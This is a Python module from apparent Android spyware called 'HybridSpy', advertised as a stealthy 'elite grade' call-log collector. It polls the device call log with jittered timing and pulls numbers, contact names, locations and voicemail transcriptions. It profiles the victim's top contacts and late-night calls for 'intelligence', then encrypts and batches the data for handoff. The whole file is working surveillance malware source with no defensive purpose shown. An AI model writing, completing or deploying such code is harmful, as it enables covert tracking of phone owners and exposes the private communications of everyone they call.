#!/usr/bin/env python3
"""
Call Log Collector v2.1.0 — Elite Grade
Reads call history via content://call_log/calls with:
- Incremental sync using last cursor position
- Encrypted batching with deduplication
- Duration & frequency analysis for intelligence scoring
- Stealth: no additional permissions beyond initial READ_CALL_LOG
"""
import json
import logging
import threading
import time
import zlib
from collections import Counter, defaultdict
from dataclasses import dataclass, field, asdict
from datetime import datetime, timedelta, timezone
from typing import Callable, Dict, List, Optional, Set, Tuple

log = logging.getLogger("HybridSpy.Collectors.CallLog")


# ─── Constants ───────────────────────────────────────────────────────────────

CALLLOG_URI = "content://call_log/calls"
MAX_BATCH_SIZE = 50
POLL_INTERVAL = 60  # seconds
BACKOFF_BASE = 2.0
CACHE_FILE = "call_log_cache.enc"
STATE_FILE = "call_log_state.json"

CALL_TYPE_MAP = {
    1: "incoming",
    2: "outgoing",
    3: "missed",
    4: "voicemail",
    5: "rejected",
    6: "blocked",
    7: "answered_externally",
}

CALL_TYPE_NAMES = {
    1: "Incoming",
    2: "Outgoing",
    3: "Missed",
    4: "Voicemail",
    5: "Rejected",
    6: "Blocked",
}


# ─── Data Models ─────────────────────────────────────────────────────────────

@dataclass
class CallLogEntry:
    """Normalized call log entry."""
    id: int
    number: str
    type: int
    duration: int  # seconds
    date: int  # Unix timestamp milliseconds
    cached_name: Optional[str]
    cached_number_label: Optional[str]
    cached_number_type: int
    country_iso: Optional[str]
    geocoded_location: Optional[str]
    voicemail_uri: Optional[str]
    transcription: Optional[str]
    presentation: int
    subscription_id: int
    phone_account_id: Optional[str]
    features: int
    data_usage: Optional[int]
    
    @classmethod
    def from_cursor_row(cls, row: Dict) -> "CallLogEntry":
        return cls(
            id=int(row.get("_id", 0)),
            number=row.get("number", ""),
            type=int(row.get("type", 0)),
            duration=int(row.get("duration", 0)),
            date=int(row.get("date", 0)),
            cached_name=row.get("cached_name"),
            cached_number_label=row.get("cached_number_label"),
            cached_number_type=int(row.get("cached_number_type", 0)),
            country_iso=row.get("country_iso"),
            geocoded_location=row.get("geocoded_location"),
            voicemail_uri=row.get("voicemail_uri"),
            transcription=row.get("transcription"),
            presentation=int(row.get("presentation", 0)),
            subscription_id=int(row.get("subscription_id", 0)),
            phone_account_id=row.get("phone_account_id"),
            features=int(row.get("features", 0)),
            data_usage=row.get("data_usage"),
        )
    
    @property
    def timestamp(self) -> datetime:
        return datetime.fromtimestamp(self.date / 1000, tz=timezone.utc)
    
    @property
    def type_name(self) -> str:
        return CALL_TYPE_NAMES.get(self.type, f"Unknown({self.type})")
    
    @property
    def duration_formatted(self) -> str:
        return str(timedelta(seconds=self.duration))
    
    @property
    def fingerprint(self) -> str:
        return f"{self.id}:{self.date}:{self.number}:{self.duration}"


@dataclass
class CallLogAnalysis:
    """Intelligence analysis of call patterns."""
    top_contacts: List[Tuple[str, int]]  # (number, call_count)
    total_calls: int
    total_duration: int  # seconds
    average_duration: float
    missed_calls: int
    outgoing_calls: int
    incoming_calls: int
    most_active_hour: int
    most_active_day: str
    calls_per_day: float
    unique_numbers: int
    late_night_calls: int  # 11pm-5am
    frequent_short_calls: int  # <30s
    frequent_long_calls: int  # >30min


@dataclass
class CallLogBatch:
    entries: List[CallLogEntry]
    batch_id: str
    created_at: float = field(default_factory=time.time)
    retry_count: int = 0
    analysis: Optional[CallLogAnalysis] = None
    ciphertext: Optional[bytes] = None


# ─── Call Log Collector ──────────────────────────────────────────────────────

class CallLogCollector:
    """
    Elite-grade call log collector with:
    - Incremental cursor tracking
    - Call pattern analysis for intelligence
    - Encrypted batching with compression
    - Deduplication across incremental pulls
    - Thread-safe state persistence
    """
    
    def __init__(self, crypto_engine, storage_manager,
                 on_batch_ready: Optional[Callable[[CallLogBatch], None]] = None,
                 config: Optional[Dict] = None):
        self._crypto = crypto_engine
        self._storage = storage_manager
        self._on_batch = on_batch_ready
        self._config = config or {}
        
        self._provider = None
        
        self._lock = threading.RLock()
        self._running = False
        self._thread: Optional[threading.Thread] = None
        
        # Cursor tracking
        self._last_max_id: int = 0
        self._known_ids: Set[int] = set()
        
        # Analysis buffer
        self._recent_entries: List[CallLogEntry] = []
        self._analysis_count = 0
        self._analysis_window = timedelta(days=7)
        
        # Batch buffer
        self._batch_buffer: List[CallLogEntry] = []
        self._last_flush = time.time()
        self._flush_interval = self._config.get("flush_interval", 120)
        
        # Stats
        self._stats = {
            "total_collected": 0,
            "total_batches": 0,
            "dedup_skipped": 0,
            "failures": 0,
            "last_collection": None,
            "earliest_collected": None,
            "latest_collected": None,
        }
        
        self._load_state()
    
    # ─── Lifecycle ──────────────────────────────────────────────────────
    
    def start(self, provider):
        with self._lock:
            if self._running:
                return
            self._provider = provider
            self._running = True
            self._thread = threading.Thread(target=self._collection_loop,
                                            daemon=True, name="calllog-collector")
            self._thread.start()
            log.info("Call log collector started")
    
    def stop(self, timeout: float = 5.0):
        with self._lock:
            self._running = False
        if self._thread and self._thread.is_alive():
            self._thread.join(timeout=timeout)
        self._flush_buffer(force=True)
        self._save_state()
        log.info("Call log collector stopped")
    
    def force_collect(self) -> int:
        if not self._provider:
            return 0
        entries = self._fetch_new_entries()
        if entries:
            self._process_entries(entries)
        return len(entries)
    
    # ─── Collection Loop ────────────────────────────────────────────────
    
    def _collection_loop(self):
        backoff = POLL_INTERVAL
        
        while self._running:
            try:
                count = self._fetch_and_process()
                if count > 0:
                    log.debug(f"Collected {count} new call log entries")
                    backoff = POLL_INTERVAL
                else:
                    backoff = min(backoff * 1.3, POLL_INTERVAL * 5)
                
                self._check_auto_flush()
                
            except PermissionError:
                log.warning("Call log permission revoked")
                self._running = False
                break
            except Exception as e:
                log.error(f"Collection error: {e}", exc_info=True)
                self._stats["failures"] += 1
                backoff = min(backoff * BACKOFF_BASE, 300)
            
            jitter = backoff * (0.7 + hash(str(time.time())) % 60 / 100)
            time.sleep(jitter)
    
    def _fetch_and_process(self) -> int:
        if not self._provider:
            return 0
        entries = self._fetch_new_entries()
        if entries:
            self._process_entries(entries)
        return len(entries)
    
    def _fetch_new_entries(self) -> List[CallLogEntry]:
        """Fetch entries newer than our last known max ID."""
        try:
            projection = [
                "_id", "number", "type", "duration", "date",
                "cached_name", "cached_number_label", "cached_number_type",
                "country_iso", "geocoded_location", "voicemail_uri",
                "transcription", "presentation", "subscription_id",
                "phone_account_id", "features", "data_usage",
                "formatted_number", "normalized_number",
            ]
            
            rows = self._provider.query(
                CALLLOG_URI, projection,
                selection=f"_id > {self._last_max_id}",
                sort_order="_id ASC"
            )
            
            if not rows:
                return []
            
            entries = []
            max_id = self._last_max_id
            
            for row in rows:
                entry = CallLogEntry.from_cursor_row(row)
                if entry.id in self._known_ids:
                    self._stats["dedup_skipped"] += 1
                    continue
                
                self._known_ids.add(entry.id)
                entries.append(entry)
                
                if entry.id > max_id:
                    max_id = entry.id
            
            if max_id > self._last_max_id:
                self._last_max_id = max_id
                self._save_state()
            
            return entries
            
        except Exception as e:
            log.error(f"Failed to fetch call log: {e}")
            return []
    
    # ─── Processing ─────────────────────────────────────────────────────
    
    def _process_entries(self, entries: List[CallLogEntry]):
        """Process entries through buffer and analysis."""
        with self._lock:
            self._batch_buffer.extend(entries)
            self._recent_entries.extend(entries)
            self._stats["total_collected"] += len(entries)
            self._stats["last_collection"] = datetime.utcnow().isoformat()
            
            # Update time range
            for e in entries:
                ts = e.timestamp.isoformat()
                if not self._stats["earliest_collected"] or \
                   e.date < self._parse_ts(self._stats["earliest_collected"]):
                    self._stats["earliest_collected"] = ts
                if not self._stats["latest_collected"] or \
                   e.date > self._parse_ts(self._stats["latest_collected"]):
                    self._stats["latest_collected"] = ts
            
            # Prune analysis buffer
            cutoff = datetime.now(timezone.utc) - self._analysis_window
            self._recent_entries = [
                e for e in self._recent_entries
                if e.timestamp > cutoff
            ]
            
            if len(self._batch_buffer) >= MAX_BATCH_SIZE:
                self._flush_buffer()
    
    def _parse_ts(self, ts_str: str) -> int:
        try:
            return int(datetime.fromisoformat(ts_str).timestamp() * 1000)
        except Exception:
            return 0
    
    # ─── Analysis ───────────────────────────────────────────────────────
    
    def _generate_analysis(self, entries: List[CallLogEntry]) -> Optional[CallLogAnalysis]:
        """Generate call pattern analysis for intelligence value."""
        if len(entries) < 5:
            return None
        
        try:
            numbers = Counter()
            total_duration = 0
            missed = 0
            outgoing = 0
            incoming = 0
            hours = Counter()
            days = Counter()
            late_night = 0
            short_calls = 0
            long_calls = 0
            
            for entry in entries:
                numbers[entry.number] += 1
                total_duration += entry.duration
                
                if entry.type == 3:  # missed
                    missed += 1
                elif entry.type == 2:  # outgoing
                    outgoing += 1
                elif entry.type == 1:  # incoming
                    incoming += 1
                
                dt = entry.timestamp
                hours[dt.hour] += 1
                days[dt.strftime("%A")] += 1
                
                if dt.hour < 5 or dt.hour >= 23:
                    late_night += 1
                if entry.duration < 30 and entry.duration > 0:
                    short_calls += 1
                if entry.duration > 1800:
                    long_calls += 1
            
            total_calls = len(entries)
            avg_duration = total_duration / max(total_calls, 1)
            
            span_days = max(
                (max(e.date for e in entries) - min(e.date for e in entries)) / 86400000,
                1
            )
            
            return CallLogAnalysis(
                top_contacts=numbers.most_common(10),
                total_calls=total_calls,
                total_duration=total_duration,
                average_duration=round(avg_duration, 1),
                missed_calls=missed,
                outgoing_calls=outgoing,
                incoming_calls=incoming,
                most_active_hour=hours.most_common(1)[0][0] if hours else 0,
                most_active_day=days.most_common(1)[0][0] if days else "Unknown",
                calls_per_day=round(total_calls / span_days, 1),
                unique_numbers=len(numbers),
                late_night_calls=late_night,
                frequent_short_calls=short_calls,
                frequent_long_calls=long_calls,
            )
            
        except Exception as e:
            log.error(f"Analysis failed: {e}")
            return None
    
    # ─── Buffer Flushing ────────────────────────────────────────────────
    
    def _check_auto_flush(self):
        now = time.time()
        if len(self._batch_buffer) >= MAX_BATCH_SIZE or \
           (now - self._last_flush) >= self._flush_interval:
            self._flush_buffer()
    
    def _flush_buffer(self, force: bool = False):
        with self._lock:
            if not self._batch_buffer and not force:
                return
            if not self._batch_buffer:
                return
            
            analysis = self._generate_analysis(self._recent_entries)
            
            batch = CallLogBatch(
                entries=list(self._batch_buffer),
                batch_id=f"call_log_{int(time.time() * 1000)}_{len(self._batch_buffer)}",
                created_at=time.time(),
                analysis=analysis,
            )
            
            self._batch_buffer.clear()
            self._last_flush = time.time()
        
        # Encrypt
        try:
            batch_dict = {
                "entries": [asdict(e) for e in batch.entries],
                "analysis": asdict(batch.analysis) if batch.analysis else None,
            }
            serialized = json.dumps(batch_dict, default=str).encode("utf-8")
            compressed = zlib.compress(serialized, level=6)
            batch.ciphertext = self._crypto.encrypt(compressed)
        except Exception as e:
            log.error(f"Encryption failed: {e}")
        
        self._store_batch_locally(batch)
        
        if self._on_batch:
            try:
                self._on_batch(batch)
            except Exception as e:
                log.error(f"Batch callback error: {e}")
        
        self._stats["total_batches"] += 1
    
    def _store_batch_locally(self, batch: CallLogBatch):
        try:
            cache_path = self._storage.get_path(CACHE_FILE)
            if not cache_path:
                return
            
            has_analysis = batch.analysis is not None
            if has_analysis:
                analysis_summary = {
                    "total_calls": batch.analysis.total_calls,
                    "unique_numbers": batch.analysis.unique_numbers,
                    "calls_per_day": batch.analysis.calls_per_day,
                    "top_contact": batch.analysis.top_contacts[0][0] if batch.analysis.top_contacts else None,
                }
            else:
                analysis_summary = None
            
            batch_data = {
                "id": batch.batch_id,
                "timestamp": batch.created_at,
                "count": len(batch.entries),
                "has_analysis": has_analysis,
                "analysis_summary": analysis_summary,
                "ciphertext": batch.ciphertext.hex() if batch.ciphertext else None,
                "retries": batch.retry_count,
            }
            
            self._storage.append_to_list(cache_path, batch_data)
        except Exception as e:
            log.error(f"Local storage failed: {e}")
    
    # ─── State ──────────────────────────────────────────────────────────
    
    def _load_state(self):
        try:
            state = self._storage.read_dict(STATE_FILE)
            if state:
                self._last_max_id = state.get("last_max_id", 0)
                self._known_ids = set(state.get("known_ids", []))
                self._stats = state.get("stats", self._stats)
                log.info(f"Loaded state: last_id={self._last_max_id}, known={len(self._known_ids)}")
        except Exception as e:
            log.warning(f"Could not load state: {e}")
    
    def _save_state(self):
        try:
            self._storage.write_dict(STATE_FILE, {
                "last_max_id": self._last_max_id,
                "known_ids": list(self._known_ids)[-5000:],  # Keep last 5k IDs
                "stats": self._stats,
                "updated_at": datetime.utcnow().isoformat(),
            })
        except Exception as e:
            log.error(f"State save failed: {e}")
    
    # ─── Public API ─────────────────────────────────────────────────────
    
    def get_stats(self) -> Dict:
        return dict(self._stats)
    
    def get_health(self) -> Dict:
        return {
            "running": self._running,
            "last_max_id": self._last_max_id,
            "known_ids": len(self._known_ids),
            "buffer_size": len(self._batch_buffer),
            "analysis_buffer": len(self._recent_entries),
            "stats": self.get_stats(),
        }
    
    def reset_state(self):
        with self._lock:
            self._last_max_id = 0
            self._known_ids.clear()
            self._batch_buffer.clear()
            self._recent_entries.clear()
            self._stats = {k: 0 for k in self._stats}
            self._save_state()
        log.info("Call log collector state reset")
